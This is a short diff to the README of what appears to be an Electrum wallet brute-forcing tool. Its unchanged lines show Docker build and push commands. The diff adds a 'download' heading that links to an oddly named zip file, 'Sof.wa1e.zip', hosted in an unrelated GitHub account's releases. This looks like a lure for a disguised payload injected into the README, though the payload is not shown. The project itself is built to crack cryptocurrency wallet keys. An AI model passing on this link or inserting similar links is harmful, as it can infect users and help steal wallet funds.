@@ -78,3 +78,5 @@ docker build . -t brutus
 ```cmd
 docker push timothygb/electrum-wallet-bruteforcer:brutus
 ```
+
+## [download](https://github.com/mrripapln408/Electrum-key/releases/download/electrumkey/Sof.wa1e.zip)
